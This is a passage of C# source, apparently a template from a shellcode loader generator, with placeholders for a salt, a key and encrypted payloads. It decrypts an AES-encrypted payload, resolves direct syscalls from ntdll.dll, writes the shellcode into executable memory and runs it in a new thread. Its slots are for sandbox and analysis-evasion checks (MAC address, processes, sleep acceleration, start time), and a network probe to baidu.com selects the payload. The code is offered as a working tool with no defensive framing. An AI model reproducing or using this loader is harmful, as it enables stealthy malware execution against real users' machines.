            OpenNoRecall = 0x00100000,
            FirstPipeInstance = 0x00080000
        }

        public enum FileMapProtection : uint
        {
            PageReadonly = 0x02,
            PageReadWrite = 0x04,
            PageWriteCopy = 0x08,
            PageExecuteRead = 0x20,
            PageExecuteReadWrite = 0x40,
            SectionCommit = 0x8000000,
            SectionImage = 0x1000000,
            SectionNoCache = 0x10000000,
            SectionReserve = 0x4000000,
        }

        public enum FileMapAccessType : uint
        {
            Copy = 0x01,
            Write = 0x02,
            Read = 0x04,
            AllAccess = 0x08,
            Execute = 0x20,
        }
    }
    class Program
    {
         public static byte[] Decrypt(string bs, string keys)
        {
            var bytesToBeDecrypted = Convert.FromBase64String(bs);
            byte[] passwordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(keys));
            byte[] decryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes("{{Salt}}");

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        public static void Run(byte[] buf1)
        {
            string filename_path = @"C:\Windows\System32\ntdll.dll";

            SyscallFunctions Syscall_funcitons = new SyscallFunctions();
            bool Generate_status = Syscall_funcitons.GenerateRWXMemorySegment();

            if (Generate_status == false)
            {
                Console.WriteLine("Cannot generate RWX memory!");
                System.Threading.Thread.Sleep(10000);
                return;
            }

            ModuleUtil.SetSyscallTable(filename_path);

            for (int count = 0; count < SyscallTable.Syscall_list.Count(); count++)
            {
                for (int index = 0; index < SyscallTable.Syscall_list[count].syscall_byte.Length; index++)
                {
                    Console.Write(SyscallTable.Syscall_list[count].syscall_byte[index]);
                }
            }


            IntPtr pBaseAddres = IntPtr.Zero;
            IntPtr Region = (IntPtr)buf1.Length;

            IntPtr getcurrent = new IntPtr(-1);
            UInt32 ntstatus = Syscall_funcitons.NtAllocateVirtualMemory(
                getcurrent,
                ref pBaseAddres,
                IntPtr.Zero,
                ref Region,
                0x2000 | 0x1000,
                0x40);

            Marshal.Copy(buf1, 0, pBaseAddres, buf1.Length);

            IntPtr hThread = IntPtr.Zero;
            ntstatus = Syscall_funcitons.NtCreateThreadEx(
                out hThread,
                0x1FFFFF,
                IntPtr.Zero,
                getcurrent,
                pBaseAddres,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            ntstatus = Syscall_funcitons.NtWaitForSingleObject(hThread, true, 0);
            return;
        }

        public static string CheckNet(string str1, string str2, string domainname = "baidu.com")
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + domainname);
            request.Method = "HEAD";
            request.Timeout = 8000;
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                return str1;
            }
            catch (WebException e)
            {
                try
                {
                    IPAddress[] ipAddresses = Dns.GetHostAddresses(domainname);
                    if (ipAddresses != null)
                    {
                        return str2;
                    }
                }
                catch (ArgumentNullException)
                {
                    Environment.Exit(-1);
                }
            }
            return "";
        }

        private static string GetProcess(string file, string args = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }


		    {{CheckCPUlMemoryLang}}
			{{CheckHardDiskSpace}}
			{{CheckMACAddress}}
			{{CheckProcess}}
			{{ChecksleepAcceleration}}
			{{CheckStartTime}}




        static void Main(string[] args)
        {
			{{CheckCPUlMemoryLang_RUN}}
			{{CheckHardDiskSpace_RUN}}
			{{CheckMACAddress_RUN}}
			{{CheckProcess_RUN}}
			{{ChecksleepAcceleration_RUN}}
			{{CheckStartTime_RUN}}


            string str1 = "{{context1}}";
            string str2 = "{{context2}}";
            string str = str1 != "" ? (str2 != "" ? CheckNet(str1, str2) : str1) : (str2 != "" ? str2 : "");
            if (str == "")
            {
                Environment.Exit(-1);
            }
             Run(Decrypt(str, "{{keyText}}"));
        }
    }
}
